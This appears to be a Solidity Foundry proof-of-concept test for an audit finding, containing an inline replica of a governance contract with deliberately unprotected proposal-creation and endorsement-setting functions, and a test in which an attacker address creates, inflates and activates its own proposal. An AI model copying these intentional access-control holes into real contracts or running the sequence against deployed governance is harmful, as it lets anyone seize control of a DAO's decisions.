// Minimal Token stub with totalSupply()
contract TokenStub {
    uint256 immutable s;
    constructor(uint256 _s) { s = _s; }
    function totalSupply() external view returns (uint256) { return s; }
}

// Minimal vulnerable replica (inline — do NOT import from ../src/)
contract Governance {
    struct ProposalMetadata { address submitter; uint256 submissionTimestamp; }
    struct ActivatedProposal { uint256 id; uint256 activationTimestamp; }

    mapping(uint256 => ProposalMetadata) public getProposalMetadata;
    mapping(uint256 => uint256) public totalEndorsementsForProposal;
    mapping(uint256 => bool) public proposalHasBeenActivated;

    ActivatedProposal public activeProposal;

    TokenStub public VOTES;

    uint256 constant ACTIVATION_DEADLINE = 1 days;
    uint256 constant ENDORSEMENT_THRESHOLD = 10; // percent threshold
    uint256 constant GRACE_PERIOD = 0;

    event ProposalActivated(uint256 indexed id, uint256 timestamp);

    constructor() {
        VOTES = new TokenStub(100);
    }

    // Unprotected function: anyone can create a proposal and be set as its submitter
    function createProposal(uint256 proposalId_) external {
        getProposalMetadata[proposalId_] = ProposalMetadata(msg.sender, block.timestamp);
    }

    // Unprotected helper to set endorsements (for the PoC)
    function setEndorsements(uint256 proposalId_, uint256 count_) external {
        totalEndorsementsForProposal[proposalId_] = count_;
    }

    // Vulnerable function: authorizes solely by msg.sender == proposal.submitter
    function activateProposal(uint256 proposalId_) external {
        ProposalMetadata memory proposal = getProposalMetadata[proposalId_];

        require(msg.sender == proposal.submitter, "NotAuthorizedToActivateProposal");

        require(block.timestamp <= proposal.submissionTimestamp + ACTIVATION_DEADLINE, "SubmittedProposalHasExpired");

        require(
            (totalEndorsementsForProposal[proposalId_] * 100) >= VOTES.totalSupply() * ENDORSEMENT_THRESHOLD,
            "NotEnoughEndorsementsToActivateProposal"
        );

        require(proposalHasBeenActivated[proposalId_] == false, "ProposalAlreadyActivated");

        require(block.timestamp >= activeProposal.activationTimestamp + GRACE_PERIOD, "ActiveProposalNotExpired");

        activeProposal = ActivatedProposal(proposalId_, block.timestamp);
        proposalHasBeenActivated[proposalId_] = true;

        emit ProposalActivated(proposalId_, block.timestamp);
    }
}

contract GovernanceTest is Test {
    Governance target;
    address attacker;

    function setUp() public {
        target = new Governance();
        attacker = makeAddr("attacker");
    }

    function test_attacker_exploits_activateProposal() public {
        // Attacker creates a proposal; createProposal is unprotected so they become the submitter
        vm.prank(attacker);
        target.createProposal(1);

        // Attacker sets endorsements high enough to pass the threshold
        vm.prank(attacker);
        target.setEndorsements(1, 10);

        // Now attacker calls activateProposal and succeeds because authorization only checks submitter
        vm.prank(attacker);
        target.activateProposal(1);

        // Assert the proposal is marked activated
        assertEq(target.proposalHasBeenActivated(1), true);
    }
}

